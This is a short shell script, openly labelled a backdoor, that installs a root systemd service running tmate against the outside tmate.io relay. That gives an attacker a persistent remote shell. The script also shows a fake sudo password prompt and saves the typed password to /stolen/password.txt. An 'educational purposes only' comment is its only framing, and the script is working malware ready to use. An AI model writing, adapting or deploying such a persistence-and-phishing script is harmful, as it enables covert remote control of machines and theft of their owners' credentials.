#!/bin/sh
# Requires tmate and systemd
# ssh user/session_name@sgp1.tmate.io
# https://tmate.io/t/user/session_name

# Experimental
# This script is for educational purposes only

SESSION_NAME=""
API_KEY=""

SERVICE_NAME="backdoor"

SERVICE_CONTENT="[Unit]
Description=Tmate Backdoor
After=network.target
Wants=network-online.target

[Service]
Restart=always
User=root
Type=simple
ExecStart=tmate -k "$API_KEY" -n "$SESSION_NAME" -F

[Install]
WantedBy=multi-user.target
"

SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
sudo echo "$SERVICE_CONTENT" >"$SERVICE_FILE"

echo "[sudo] password for $USER:"
read -s password
sudo mkdir /stolen
sudo echo "$password" >/stolen/password.txt

sudo systemctl daemon-reload

sudo systemctl enable "$SERVICE_NAME"
sudo systemctl start "$SERVICE_NAME"
